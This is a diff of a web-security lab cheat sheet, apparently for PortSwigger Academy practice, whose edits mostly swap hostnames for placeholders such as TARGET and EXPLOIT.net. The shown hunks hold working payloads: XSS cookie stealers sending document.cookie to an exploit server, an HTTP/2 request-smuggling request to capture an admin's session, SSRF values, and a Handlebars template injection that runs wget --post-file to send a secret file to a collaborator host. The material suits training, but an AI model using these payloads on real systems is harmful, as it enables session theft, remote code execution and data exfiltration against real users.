@@ -344,20 +344,20 @@ https://TARGET.web-security-academy.net/?SearchTerm="+eval(atob("fetch("https://
 >Cross site Scriting saved in Blog post comment. This Cookie Stealer payload then send the victim session cookie to the exploit server logs.  
 
 ```html
-<img src="1" onerror="window.location='http://exploit.net/cookie='+document.cookie">
+<img src="1" onerror="window.location='https://exploit.net/cookie='+document.cookie">
 ```  
 
 >Product and Store lookup  
 
 ```html
-?productId=1&storeId="></select><img src=x onerror=this.src='http://exploit.net/?'+document.cookie;>
+?productId=1&storeId="></select><img src=x onerror=this.src='https://exploit.net/?'+document.cookie;>
 ```  
 
 >Stored XSS Blog post  
 
 ```JavaScript
 <script>
-document.write('<img src="http://exploit.net?cookieStealer='+document.cookie+'" />');
+document.write('<img src="https://exploit.net?cookieStealer='+document.cookie+'" />');
 </script>
 ```  
 
@@ -710,26 +710,25 @@ search=nutty
 
 ### HTTP/2 TE desync v10a h2path
 
->Target is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length. Steal the  session cookie, of the admin visiting the target. The burp request smuggling scanner will detect the HTTP/2 TE desync vulnerability.  
+>Target is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length. Steal the  session cookie, of the admin visiting the target. The Burp extension, **HTTP Request Smuggler** will ***identify*** the vulnerability as HTTP/2 TE desync v10a (H2.TE) vulnerability.  
 
 ![HTTP/2 TE desync v10a h2path](images/HTTP2-TE-desync-v10a-h2path.png)  
 
->Note: enable the **Allow HTTP/2 ALPN override** option.  
+>Note: Switch to **HTTP/2** in the inspector request attributes and Enable the **Allow HTTP/2 ALPN override** option in repeat menu.  
 
 ```html
 POST /x HTTP/2
-Host: 0abf00a503615fccc3301f8f008000fe.web-security-academy.net
+Host: TARGET.web-security-academy.net
 Transfer-Encoding: chunked
 
 0
 
 GET /x HTTP/1.1
-Host: 0abf00a503615fccc3301f8f008000fe.web-security-academy.net\r\n
+Host: TARGET.web-security-academy.net\r\n
 \r\n
 ```  
 
->Note: Paths in both POST and GET requests points to a non-existent endpoint. This help to ***identify*** when not getting a 404 response, it is from victim user stolen request captured.  
->Note: Remember to terminate the smuggled request properly by including the sequence ```\r\n\r\n``` after the Host header.  
+>Note: Paths in both POST and GET requests points to non-existent endpoints. This help to ***identify*** when not getting a 404 response, the response is from victim user captured request. **Remember** to terminate the smuggled request properly by including the sequence ```\r\n\r\n``` after the Host header.  
 
 ![302 Response once stolen admin cookie request captured](images/302-stolen-admin-cookie.png)  
 
@@ -1263,7 +1262,7 @@ CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)
 >SSRF exploitation examples.  
 
 ```html
-/product/nextProduct?currentProductId=6&path=http://evil-user.net  
+/product/nextProduct?currentProductId=6&path=https://EXPLOIT.net  
 
 stockApi=http://localhost:6566/admin  
 
@@ -1569,7 +1568,7 @@ wrtz{{#with "s" as |string|}}
             {{this.pop}}
             {{#with string.split as |codelist|}}
                 {{this.pop}}
-                {{this.push "return require('child_process').exec('wget http://ext.burpcollab.net --post-file=/home/carlos/secret');"}}
+                {{this.push "return require('child_process').exec('wget https://COLLABORATOR.net --post-file=/home/carlos/secret');"}}
                 {{this.pop}}
                 {{#each conslist}}
                     {{#with (string.sub.apply 0 codelist)}}
